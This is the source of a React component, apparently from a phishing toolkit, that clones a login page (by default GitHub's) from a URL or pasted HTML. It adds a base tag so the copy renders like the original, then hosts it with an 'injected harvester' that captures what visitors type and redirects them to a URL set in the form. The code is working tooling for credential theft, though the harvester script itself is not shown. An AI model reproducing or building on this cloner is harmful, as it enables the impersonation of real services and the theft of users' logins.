
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import {
  Card, CardHeader, CardTitle, CardDescription,
  CardContent, CardFooter
} from '@/components/ui/card';
import {
  Form, FormControl, FormField, FormItem,
  FormLabel, FormMessage
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Globe, Wand, StopCircle, Clipboard } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Textarea } from './ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from './ui/tabs';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
  message: 'Either a URL or HTML content is required.',
  path: ['urlToClone'],
});

type LoginPageClonerProps = {
  onHostPage: (htmlContent: string, redirectUrl: string) => void;
};

export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
  const { toast } = useToast();
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const form = useForm<z.infer<typeof clonerSchema>>({
    resolver: zodResolver(clonerSchema),
    defaultValues: {
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    },
  });

  const resetState = () => {
    setModifiedHtml(null);
    setIsProcessing(false);
    form.reset({
      redirectUrl: 'https://github.com/password_reset',
      urlToClone: 'https://github.com/login',
      htmlContent: '',
    });
  };

  const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
    setIsProcessing(true);
    setModifiedHtml(null);

    try {
      let originalHtml = values.htmlContent;
      let baseHrefUrl = values.urlToClone;

      if (values.urlToClone) {
        toast({ title: 'Cloning Page...', description: 'Fetching HTML content from the URL.' });
        const response = await clonePageFromUrl({ url: values.urlToClone });
        originalHtml = response.htmlContent;
        form.setValue('htmlContent', originalHtml);
      } else if (originalHtml) {
        const actionMatch = originalHtml.match(/action="([^"]+)"/);
        baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
          ? new URL(actionMatch[1]).origin
          : new URL(values.redirectUrl).origin;
      }

      if (!originalHtml) {
        throw new Error('No HTML content to process.');
      }

      let html = originalHtml;
      
      if (baseHrefUrl) {
        if (html.includes('<head>')) {
          html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
        } else {
          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
        }
      }

      setModifiedHtml(html);
      toast({ title: 'HTML Prepared', description: 'Raw HTML is ready for hosting.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Processing Failed', description: error });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleCopyHtml = () => {
    if (modifiedHtml) {
      navigator.clipboard.writeText(modifiedHtml);
      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>1. Page Cloner</CardTitle>
        <CardDescription>Clone a page from a URL or paste HTML to inject the harvester.</CardDescription>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(processAndInject)}>
          <CardContent className="space-y-4">
            <Tabs defaultValue="url" className="w-full">
              <TabsList className="grid w-full grid-cols-2">
                <TabsTrigger value="url">Clone from URL</TabsTrigger>
                <TabsTrigger value="html">Paste HTML</TabsTrigger>
              </TabsList>
              <TabsContent value="url" className="mt-4">
                <FormField
                  control={form.control}
                  name="urlToClone"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Target Page URL</FormLabel>
                      <FormControl>
                        <Input placeholder="https://example.com/login" {...field} value={field.value ?? ''} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </TabsContent>
              <TabsContent value="html" className="mt-4">
                <FormField
                  control={form.control}
                  name="htmlContent"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>HTML Source Code</FormLabel>
                      <FormControl>
                        <Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </TabsContent>
            </Tabs>
            <FormField
              control={form.control}
              name="redirectUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Redirect URL (after capture)</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com/login_failed" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <Button type="submit" className="w-full" disabled={isProcessing}>
              {isProcessing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
              Process HTML
            </Button>
          </CardContent>
          {modifiedHtml && (
            <CardFooter className="flex-col gap-4">
              <CardTitle className="text-xl">2. Host Page</CardTitle>
              <div className="w-full flex gap-2">
                <Button type="button" onClick={() => onHostPage(modifiedHtml, form.getValues('redirectUrl'))} disabled={isProcessing} className="w-full">
                  <Globe className="mr-2 h-4 w-4" />
                  Host Page & Inject Harvester
                </Button>
                <Button type="button" variant="secondary" onClick={handleCopyHtml}>
                  <Clipboard className="mr-2 h-4 w-4" />
                  Copy HTML
                </Button>
              </div>
              <Button type="button" onClick={resetState} variant="destructive" className="w-full">
                <StopCircle className="mr-2 h-4 w-4" /> Reset
              </Button>
            </CardFooter>
          )}
        </form>
      </Form>
    </Card>
  );
}
